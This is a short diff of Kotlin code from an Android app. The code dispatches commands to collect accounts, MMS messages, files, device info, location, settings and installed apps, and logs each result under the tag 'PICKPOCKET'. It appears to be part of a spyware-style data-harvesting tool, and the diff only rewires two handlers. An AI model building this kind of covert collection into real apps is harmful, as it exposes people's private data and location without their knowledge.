@@ -75,8 +75,8 @@ class MainActivity : AppCompatActivity() {
                             "COMMAND_GET_ACCOUNTS" -> accountsFlow().collect { account -> Log.d("PICKPOCKET", account.toString()) }
                             "COMMAND_GET_MMS" -> smsFlow().collect { mms -> Log.d("PICKPOCKET", mms.toString()) }
                             "COMMAND_GET_FILES" -> filesFlow().collect { file -> Log.d("PICKPOCKET", file.toString()) }
-                            "COMMAND_GET_DEVICE_INFO" -> deviceFlow().collect { device -> Log.d("PICKPOCKET", device.toString()) }
-                            "COMMAND_GET_LOCATION" -> deviceFlow().collect { location -> Log.d("PICKPOCKET", location.toString()) }
+                            "COMMAND_GET_DEVICE_INFO" -> deviceLaunch(this@MainActivity).let { device -> Log.d("PICKPOCKET", device.toString()) }
+                            "COMMAND_GET_LOCATION" -> locationLaunch(this@MainActivity)?.let { location -> Log.d("PICKPOCKET", location.toString()) }
                             "COMMAND_GET_SETTINGS" -> settingsFlow().collect { setting -> Log.d("PICKPOCKET", setting.toString()) }
                             "COMMAND_GET_INSTALLED_APPS" -> softwareFlow().collect { app -> Log.d("PICKPOCKET", app.toString()) }
                             else -> Log.d(TAG, "COMMAND NOT FOUND")
